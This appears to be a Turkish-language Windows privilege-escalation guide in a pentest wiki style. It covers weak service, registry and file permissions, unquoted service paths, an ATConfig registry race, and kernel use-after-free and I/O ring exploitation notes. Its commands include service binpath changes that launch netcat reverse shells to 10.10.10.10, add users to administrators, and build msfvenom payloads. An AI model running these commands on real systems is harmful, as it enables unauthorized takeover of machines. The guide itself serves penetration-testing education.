"Authenticated Users" grubunun herhangi bir hizmeti değiştirip değiştiremediğini kontrol etmeniz önerilir:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP için accesschk.exe dosyasını buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Servisi etkinleştirme

Bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_Sistem hatası 1058 oluştu._\
_Hizmet başlatılamıyor; çünkü devre dışı bırakılmış veya etkinleştirilmiş hiçbir aygıtla ilişkilendirilmemiş._

Şunu kullanarak etkinleştirebilirsiniz:

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**upnphost hizmetinin çalışması için SSDPSRV'ye bağlı olduğunu (XP SP1 için) göz önünde bulundurun**

**Bu soruna yönelik başka bir geçici çözüm** şunu çalıştırmaktır:

```
sc.exe config usosvc start= auto
```

### **Servis binary yolunu değiştirme**

"Authenticated users" grubu bir servis üzerinde **SERVICE_ALL_ACCESS** yetkisine sahipse, servisin yürütülebilir binary dosyasını değiştirmek mümkündür. **sc**'yi değiştirmek ve çalıştırmak için:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Servisi yeniden başlat

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Privileges çeşitli izinler aracılığıyla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Service binary'sinin yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar ve böylece service yapılandırmalarının değiştirilmesine olanak tanır.
- **WRITE_OWNER**: Sahipliğin alınmasına ve izinlerin yeniden yapılandırılmasına olanak tanır.
- **GENERIC_WRITE**: Service yapılandırmalarını değiştirme yeteneğini de sağlar.
- **GENERIC_ALL**: Service yapılandırmalarını değiştirme yeteneğini de sağlar.

Bu zafiyetin tespiti ve exploit edilmesi için _exploit/windows/local/service_permissions_ kullanılabilir.

### Services binaries için zayıf izinler

Bir service **`LocalSystem`**, **`LocalService`**, **`NetworkService`** veya ayrıcalıklı bir domain hesabı olarak çalışıyorsa ancak **düşük ayrıcalıklı kullanıcılar service EXE'sini veya üst klasörünü değiştirebiliyorsa**, **binary'yi değiştirip service'i yeniden başlatarak** service çoğu zaman ele geçirilebilir.

Bir service tarafından çalıştırılan binary'yi değiştirebilip değiştiremeyeceğinizi veya binary'nin bulunduğu klasörde **yazma izniniz** olup olmadığını kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html)**.**)\
Bir service tarafından çalıştırılan tüm binary'leri **wmic** (system32'de değil) kullanarak listeleyebilir, izinlerinizi **icacls** kullanarak kontrol edebilirsiniz:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Ayrıca **sc** ve **icacls** kullanabilirsiniz:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**, **`BUILTIN\Users`** veya **`Authenticated Users`** için verilmiş tehlikeli ACL’leri arayın; özellikle hizmetin yürütülebilir dosyasında veya onu içeren dizinde **`(F)`**, **`(M)`** ya da **`(W)`** izinlerini kontrol edin. Pratik bir kötüye kullanım akışı:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` ile hizmet hesabını ve yürütülebilir dosya yolunu doğrulayın.
2. `icacls <path>` ile ikili dosyanın yazılabilir olduğunu doğrulayın.
3. Hizmet ikili dosyasını bir payload veya geçerli bir kötü amaçlı hizmet ikili dosyasıyla değiştirin.
4. `sc stop <service_name> && sc start <service_name>` ile hizmeti yeniden başlatın (veya yeniden başlatmayı / hizmet tetikleyicisini bekleyin).

Yararlı otomatik kontroller:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Hizmet normal bir kullanıcının hizmeti yeniden başlatmasına izin vermiyorsa, sistem açılışında otomatik olarak başlatılıp başlatılmadığını, yeniden başlatan bir hata eylemi olup olmadığını veya hizmeti kullanan uygulamanın hizmeti dolaylı olarak tetikleyip tetikleyemediğini kontrol edin.

### Hizmet kayıt defteri değiştirme izinleri

Herhangi bir hizmet kayıt defterini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir hizmet **kayıt defteri** üzerindeki **izinlerinizi** şu komutla **kontrol edebilirsiniz**:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Özgün izin testi şöyle belirtilmişti:

**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** grubunun `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Sahiplerse, hizmet tarafından çalıştırılan binary değiştirilebilir.

Belirli bir hizmet anahtarında **Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** grubunun yazma yetkisi veren registry izinlerine sahip olup olmadığını inceleyin. Tek başına bir ACL girdisi, etkin erişimi kanıtlamaz: deny girdileri, geçerli token ve devralınan izinler önemlidir. Registry-key izinleri, hizmet nesnesinin `SERVICE_CHANGE_CONFIG` ve `SERVICE_START` izinlerinden ayrıdır. Privilege escalation için ayrıca kullanılabilir bir hizmet yapılandırma alanı, hizmeti tetikleme yöntemi ve daha ayrıcalıklı bir hizmet kimliği gerekir. Microsoft'un [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) ve [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) belgelerine bakın.

Çalıştırılan binary'nin Path değerini değiştirmek için:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Kayıt Defteri symlink race ile keyfi HKLM değer yazımı (ATConfig)

Bazı Windows Erişilebilirlik özellikleri, daha sonra bir **SYSTEM** işlemi tarafından HKLM oturum anahtarına kopyalanan kullanıcı başına **ATConfig** anahtarları oluşturur. Kayıt Defteri **symbolic link race** kullanılarak bu ayrıcalıklı yazma işlemi **herhangi bir HKLM yoluna** yönlendirilebilir ve keyfi HKLM **değer yazma** primitive’i elde edilebilir.<sup>[[18]](#references)</sup>

Anahtar konumları (örnek: Ekran Klavyesi `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs`, yüklü erişilebilirlik özelliklerini listeler.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>`, kullanıcı tarafından denetlenebilen yapılandırmayı depolar.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>`, oturum açma/güvenli masaüstü geçişleri sırasında oluşturulur ve kullanıcı tarafından yazılabilir.

Kötüye kullanım akışı (CVE-2026-24291 / ATConfig):

1. SYSTEM tarafından yazılmasını istediğiniz değeri **HKCU ATConfig** içine yerleştirin.
2. Güvenli masaüstü kopyalama işlemini tetikleyin (ör. **LockWorkstation**); bu, AT broker akışını başlatır.
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` üzerine bir **oplock** koyarak **race’i kazanın**; oplock tetiklendiğinde **HKLM Session ATConfig** anahtarını, korumalı bir HKLM hedefini gösteren bir **Kayıt Defteri bağlantısı** ile değiştirin.
4. SYSTEM, saldırganın seçtiği değeri yönlendirilmiş HKLM yoluna yazar.

Keyfi HKLM değer yazma elde ettikten sonra, hizmet yapılandırma değerlerini üzerine yazarak LPE’ye geçin:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komut satırı)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Normal bir kullanıcının başlatabileceği bir hizmet seçin (ör. **`msiserver`**) ve yazma işleminden sonra hizmeti tetikleyin. **Not:** Genel exploit uygulaması, race’in bir parçası olarak iş istasyonunu kilitler.

Örnek araçlar (RegPwn BOF / bağımsız):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory izinleri

Bir registry üzerinde bu izne sahipseniz, **bu registry altında alt registry'ler oluşturabilirsiniz** anlamına gelir. Windows services söz konusu olduğunda bu, **rastgele kod çalıştırmak için yeterlidir:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Bir executable'ın yolu tırnak işaretleri içine alınmamışsa, Windows boşluklardan önce gelen her ifadeyi çalıştırmayı dener.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows şunları çalıştırmayı dener:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Yerleşik Windows hizmetlerine ait olanlar hariç, tırnak içine alınmamış tüm hizmet yollarını listeleyin:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Bu güvenlik açığını** metasploit ile tespit edip istismar edebilirsiniz: `exploit/windows/local/trusted\_service\_path` Metasploit ile manuel olarak bir servis ikilisi oluşturabilirsiniz:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Kurtarma Eylemleri

Windows, kullanıcıların bir hizmet başarısız olduğunda gerçekleştirilecek eylemleri belirtmesine olanak tanır. Bu özellik, bir binary dosyayı işaret edecek şekilde yapılandırılabilir. Bu binary dosya değiştirilebiliyorsa privilege escalation mümkün olabilir. Daha fazla bilgi [resmi belgelerde](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) bulunabilir.

## Zamanlanmış görev betiği hedefleri

`.bat` veya `.cmd` dosyasıyla `cmd.exe /c` çalıştıran etkin bir görev için, `cmd.exe`'nin yanı sıra **action arguments** içinde belirtilen betiği de kontrol edin. Aynı durum, PowerShell `-File` gibi yorumlayıcılara açıkça verilen dosya argümanları için de geçerlidir. Zamanlanmış bir batch dosyası doğrudan bir PowerShell `-File` çağrısı içeriyorsa, başvurulan betiğin ACL'sini de inceleyin; değişkenler, koşullu ifadeler ve shell zincirleme işlemleri elle izlenmelidir. Çağıran hesabın yazabildiği bir betik veya üst dizin, yalnızca yapılandırılmış görev sorumlusu çağırandan farklıysa ve görev gerçekten o eyleme ulaşıyorsa hesaplar arası yürütme için bir ipucudur. Betikler için yalnızca sona eklemeye izin veren bir ACL önem taşıyabilir; ancak daha önceki bir `exit` veya başka bir kontrol akışı, eklenen satırların erişilemez olmasına yol açabilir. Privilege escalation olduğunu iddia etmeden önce etkin ACL'leri, [görev yürütme bağlamını](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), çalışma dizinini, tetikleyiciyi ve uygulama denetimi politikasını doğrulayın. Envanter çıkarma sırasında betiği değiştirmeyin veya görevi başlatmayın.

## Erişilebilir dosyalardaki adlandırılmış akışlar

NTFS'de okunabilir bir dosyanın, sıradan bir dizin listesinde görünmeyen, adlandırılmış bir `:$DATA` akışı olabilir. Erişilebilir yedekleme veya yapılandırma dosyalarından oluşan küçük ve ilgili bir küme için, içerikleri açmadan önce akış **adlarını ve boyutlarını** inceleyin. Windows bu akışları [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) ve PowerShell'in [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) komutuyla gösterir. Bir sırrı ima eden akış adı yalnızca bir ipucudur. Dosya için etkin okuma iznini, dosya sisteminin akış desteğini, akışın kullanılabilir kimlik bilgileri içerip içermediğini ve bu kimlik bilgilerinin gerçekte hangi hesapla kimlik doğrulaması yaptığını kontrol edin. Olağan envanter çıkarma sırasında akışları yinelemeli olarak taramaktan ve akış içeriklerini yazdırmaktan kaçının.

## Zamanlanmış Windows Driver Kit yardımcı programı girdileri

İsteğe bağlı Windows Driver Kit, çalıştırıldığı dizinden `command.txt`, `reboot.rsf` ve bir projenin `working\rsf.rsf` dosyasını kullanabilen `StandaloneRunner.exe` içerir. Bu yardımcı programı ayrıcalıklı bir hesapla başlatan zamanlanmış bir görev veya hizmet, yardımcı programın yürütülebilir dosyası korunuyor olsa bile bu girdilere düşük ayrıcalıklı yazma erişimini söz konusu hesabın bağlamında komut yürütmeye dönüştürebilir. Ayrıcalıklı tüketiciyi ve **her iki** ek dosyanın da oluşturulabildiğini veya değiştirilebildiğini doğrulayın; yalnızca yardımcı programı bulmak yeterli değildir.

Zamanlanmış bir görev için, eyleminin [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) değerini ve iki ek dosya yolunun ACL'lerini inceleyin. Görev bir çalışma dizini belirtmiyorsa, yürütülebilir dosyanın bulunduğu dizin doğrulanması gereken bir ipucudur; görevin girdilerini oradan okuduğunun kanıtı değildir. Projenin çalışma dosyası önkoşulu da karşılanmalıdır. Görevin SYSTEM olarak çalıştığını varsaymak yerine gerçek görev sorumlusunu kontrol edin.

## Uygulamalar

### Yüklü Uygulamalar

**Binary dosyaların izinlerini** (belki birini üzerine yazarak privilege escalation sağlayabilirsiniz) ve **klasörlerin** izinlerini kontrol edin ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent onarım yolu

[CVE-2024-0670](https://checkmk.com/werk/16361), komut dosyalarını `C:\Windows\Temp` içine yazan ve değiştirme başarısız olduğunda önceden var olan, yazmaya karşı korumalı bir dosyayı çalıştıran eski Checkmk Windows agent sürümlerini etkiler. Üretici sorunu 2.1.0p40, 2.2.0p23, 2.3.0b1 ve 2.4.0b1 sürümlerinde düzeltti. Yüklü tam yama düzeyini ve etkilenen agent işleminin çalışıp çalışamayacağını kontrol edin; yalnızca `2.1` gibi bir dal etiketi, etkilenme durumunu belirlemek için yeterli değildir. Dosya veya agent komutu oluşturmadan ya da tetiklemeden yapılan envanter çalışması sürümü, hizmet durumunu ve Temp izinlerini inceleyebilir.

#### ADSelfService Plus SAML hizmeti incelemesi

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html), 6210 ve önceki ADSelfService Plus sürümlerini etkiledi; üretici sorunu 6211 derlemesinde düzeltti. Bu güvenlik açığı yalnızca SAML SSO **etkinse veya geçmişte etkinleştirilmişse** önem taşır. Bu nedenle yüklü ürün kaydı veya hizmet yolu bir ipucudur, güvenlik açığı tespiti değildir: tam derleme sürümünü, SAML yapılandırma geçmişini, hizmetin ağdan erişilebilirliğini ve çalıştığı hesabı doğrulayın. Hizmet üzerinden kod yürütülmesi, o hesabın ayrıcalıklarını devralır; SYSTEM olarak çalıştırılması için örneğin SYSTEM hesabıyla çalışması gerekir. Ürünün Backup dizininde okunabilir bir `OfflineBackup_*.ezip` bulunması, ayrı ve şifreli bir yedek ipucudur; kullanılabilir bir kimlik bilgisinin veya bu SAML açığının kanıtı değildir. Rutin envanter sırasında dosyayı açmadan yolunu ve erişim izinlerini kaydedin.

#### Jenkins controller ve etki alanı hesabı sınırları

Bir Windows Jenkins controller'ında, bir iş oluşturma veya yapılandırma iznini işi başlatma izninden ayırın: [Jenkins bunları ayrı `Job/Create`, `Job/Configure` ve `Job/Build` izinleri olarak belgeliyor](https://www.jenkins.io/doc/book/security/access-control/permissions/). Yapılandırılmış bir zamanlama veya uzak tetikleyici başka bir derleme yolu sağlayabilir; ancak etkin olduğunu ve derlemenin gerçekten çalıştığını doğrulayın. Kod yürütme, controller'ın veya seçilen agent'ın kimliğiyle gerçekleşir; kayıtlı bir kimlik bilgisi yalnızca işin erişebildiği kapsamda kullanılabilir. Ayrıca `JENKINS_HOME` meta verilerine erişimi inceleyin: Jenkins kimlik bilgisi materyalini ve şifreleme anahtarlarını `credentials.xml`, `secrets/hudson.util.Secret` ve `secrets/master.key` dosyalarında tutar ([Jenkins gizli veri depolama](https://www.jenkins.io/doc/developer/security/secrets/)). Bu dosyaların varlığı tek başına bir parolayı açığa çıkarmaz; **gerekli dosyalara okuma erişimini** ve ayrı bir hesap yeniden kullanımı yolunu doğrulayın, ortak çıktılarda gizli bilgileri yazdırmayın. Hesabın bir AD kullanıcı nesnesinde `scriptPath` yazma izni varsa, bunu kullanıcılar arası kod yürütme olarak değerlendirmeden önce yazılabilir bir betik yolunu ve hedef kullanıcı olarak çalışan gerçek bir oturum açma veya zamanlanmış görev tüketicisini doğrulayın. Daha fazla grup kontrolü için etkin AD izinleri ayrıca doğrulanmalıdır.

#### Azure Pipelines self-hosted agent kimliği

Bir Azure DevOps Server veya Azure Pipelines projesinde, pipeline **oluşturma veya düzenleme** iznini onu **kuyruğa alma** ve seçili agent pool'u kullanma izninden ayırın; [Microsoft pipeline izinlerini](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) ve [pool yetkilendirmesini](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) ayrı ayrı belgeliyor. Düşük ayrıcalıklı bir hesap bir betik adımı gönderebiliyor ve bu pipeline'ı self-hosted bir Windows agent üzerinde çalıştırabiliyorsa, adım [agent'ın yapılandırılmış işletim sistemi hesabı](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) olarak yürütülür. Kullanıcılar arası veya SYSTEM düzeyine geçiş olduğunu ileri sürmeden önce tam pipeline'ı, dal/kaynak kısıtlamalarını, yetkilendirilmiş pool'u, çalıştırılabilir işi ve agent hizmetinin kimliğini doğrulayın. Yüklü bir agent, proje rolü veya tek başına depo yazma izni yalnızca bir ipucudur; pasif envanter sırasında derleme başlatmadan izinleri ve yerel hizmet meta verilerini inceleyin.

#### Microsoft Entra Connect Sync kimlik bilgileri

[Microsoft,](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) eşitleme hizmetini çalıştıran ve SQL veritabanına erişen **ADSync hizmet hesabı** ile dizin izinleri yapılandırılmış eşitleme özelliklerine bağlı olan **AD DS connector hesabı** arasındaki farkı açıklıyor. Connector kimlik bilgileri bu veritabanında şifrelenmiş olarak saklanır; anahtar materyali ise [ADSync hizmet hesabı altında DPAPI ile korunur](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Yüklü bir eşitleme hizmeti, yerel yönetici izlenimi veren bir grup veya tek başına veritabanını görebilmek; çözülebilir bir kimlik bilgisini ya da etki alanında ayrıcalık yükseltmeyi kanıtlamaz. Gerçek veritabanı okuma izinlerini, hizmet hesabının ve anahtarın erişimini, kurulum ve SQL yerleşimini, yapılandırılmış connector kimliğini ve bu kimliğin etkin AD ayrıcalıklarını ayrı ayrı inceleyin. Rutin envanter yalnızca hizmet ve erişim meta verilerini göstermeli; saklanan gizli bilgileri sorgulamamalı veya yazdırmamalıdır.

#### Yazıcı sürücüsü destek DLL izinleri

Yüklü bir yazıcı sürücüsü, destek DLL'lerini `C:\ProgramData` altında tutabilir ve bunları daha ayrıcalıklı bir yazdırma sürecinde yükleyebilir. Yazıcı WMI envanter sorgusu reddedilse bile üst dizinleri ve reparse point'leri dahil olmak üzere sürücünün tam dizinini ve DLL ACL'lerini inceleyin. [Ricoh yazıcı sürücüsü sorunu CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) için bildirilen yol `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` idi; [orijinal açıklamada](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) DLL'lerin `PrintIsolationHost.exe` tarafından yüklendiği belirtiliyor. Yazma izni veren bir ACL yalnızca bir ipucudur: deny girdileri uygulandıktan sonraki etkin yazma erişimini, ilgili sürücünün yüklü olup dosyayı ayrıcalıklı bir kimlikle yüklediğini ve üreticinin güncel sürücüsünün veya güvenlik programının kurulumdaki sorunu giderip gidermediğini doğrulayın. Yalnızca dizin adına veya sürücü sürümüne bakarak güvenlik açığı olduğu sonucuna varmayın.

### Yazma İzinleri

Bazı özel dosyaları okuyabilmek için bir yapılandırma dosyasını veya yönetici hesabıyla çalıştırılacak bir ikili dosyayı (schedtasks) değiştirebiliyor musunuz, kontrol edin.

Sistemde zayıf klasör/dosya izinlerini bulmanın bir yolu şudur:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload kalıcılığı/çalıştırma

Notepad++ `plugins` alt klasörlerindeki tüm plugin DLL’lerini otomatik olarak yükler. Yazılabilir taşınabilir/kopya bir kurulum varsa, kötü amaçlı bir plugin bırakmak her başlatmada `notepad++.exe` içinde otomatik kod çalıştırılmasını sağlar (`DllMain` ve plugin callback’leri dahil).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Başlangıçta çalıştırma

**Farklı bir kullanıcı tarafından çalıştırılacak bir registry veya binary dosyasının üzerine yazıp yazamayacağınızı kontrol edin.**\
**Yetki yükseltmek için ilgi çekici autoruns konumları** hakkında daha fazla bilgi edinmek için **aşağıdaki sayfayı okuyun**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sürücüler

Olası **üçüncü taraf, şüpheli/açık barındıran** sürücüleri arayın.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Bir driver rastgele kernel read/write primitive sunuyorsa (kötü tasarlanmış IOCTL handler'larında sık görülür), kernel memory'den doğrudan bir SYSTEM token çalarak yetki yükseltebilirsiniz.<sup>[[13]](#references)</sup> Adım adım tekniği burada görebilirsiniz:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

İlgili Windows kernel-exploitation materyalleri:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Savunmasız çağrının saldırganın kontrolündeki bir Object Manager path'ini açtığı race-condition bug'larında, lookup işlemini bilerek yavaşlatmak (max-length bileşenler veya derin directory zincirleri kullanarak) zaman aralığını mikrosaniyelerden onlarca mikrosaniyeye çıkarabilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### Cancel-safe queue UAF'leri, paged-pool ifşaları ve I/O ring pivot'ları

Bazı Windows kernel LPE zincirleri, tek başlarına zayıf olan iki bug'dan oluşturulabilir: queue lock hâlâ tutulurken bir request/CBD'yi serbest bırakan **cancel-safe queue lifetime race** ve `RtlCopyToUser` sırasında serbest bırakılmış bir paged-pool allocation'ını sızdıran **copy öncesi lock-release** ifşası.<sup>[[29]](#references)</sup>

Denetim ve exploitation notları:

- **Lock altındayken serbest bırakma + sonrasında cancel etme**: success path'in **Acquire -> CompleteRequest/free -> Release**, cancel path'in ise **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** yaptığı bir akış arayın. Success path, CBDQ/CSQ lock'unu bırakmadan önce `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` çağrısına ulaşırsa, `NtCancelIoFileEx -> IopCsqCancelRoutine` içinde bloke olmuş bir thread sonradan devam ederek serbest bırakılmış bir `PFLT_CALLBACK_DATA` değerini driver's remove callback'ine geçirebilir.
- Serbest bırakılan queue object'ini aynı boyutlu, saldırganın kontrolündeki bir paged-pool allocation'ıyla **yeniden kullanın**. `NPFS` Data Queue Entries kullanışlıdır; çünkü payload ve boyutu kontrol edilebilir, ayrıca bunları daha sonra pipe read/peek işlemleriyle inceleyebilirsiniz. Serbest bırakılan object list link'leri içeriyorsa, driver'ın özgün list head'inde durması yerine saldırganın tanımladığı request structure'larını tekrar tekrar işlemesi için bu link'leri user memory'deki **döngüsel bir sahte request node listesiyle** üzerine yazın.
- **Öngörülebilir bir write'ı geliştirin**: sahte request, bookkeeping write'larında kullanılan iç içe bir context pointer'ını (timestamps / QPC / refcount-adjacent fields) yönlendiriyorsa, **adres kontrollü ama değer kontrollü olmayan** bir kernel write elde edebilirsiniz. Bu durumda son bir code/data pointer'ı yerine, spray edilmiş bir pool object'inin **length/size** alanını hedefleyin; ardından bozulmuş object'in out-of-bounds paged-pool read sağlamasını sağlayana kadar spray'i tarayın.
- **Raceable disclosure pattern**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` yapan her syscall güçlü bir adaydır. Saldırganın kopyalanan buffer'ı büyütebilmesi (örneğin serializer'ın son allocation boyutunu artıran çok sayıda list/resource entry ekleyerek) güvenilirliği artırır; çünkü daha uzun kopyalama, makinenin çökmesine yol açmadan replacement window'ı genişletir.
- **Pointer-rich refill hedefleri**: Windows **I/O ring** registered-buffer array'leri, paged-pool boyutları saldırgan tarafından kontrol edilebildiği (`8 * regBufferCnt`) ve her eleman bir `_IOP_MC_BUFFER_ENTRY` kernel pointer'ı olduğu için mükemmel ifşa hedefleridir. Bu array'lerden birini sızdırıp çevresindeki `IORING_OBJECT`'i bulun, ardından sonraki I/O ring işlemlerinin saldırganın oluşturduğu entry'leri kullanmasını ve rastgele kernel read/write sağlamasını sağlamak için **`RegBuffers`** ve **`RegBuffersCount`** değerlerini bozun. Kullanılabilir tek write sabit bir byte sağlıyorsa (örneğin `KUSER_SHARED_DATA+0x14` üzerinden), `0x0101010101010101` gibi tekrarlanan byte'lardan oluşan bir user pointer oluşturmak için **hizalanmamış, çakışan write'lar** kullanın; bu adresi `VirtualAlloc` ile map edip sahte registered-buffer array'ini buraya yerleştirin.<sup>[[30]](#references)</sup>

Yararlı debugging göstergeleri:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
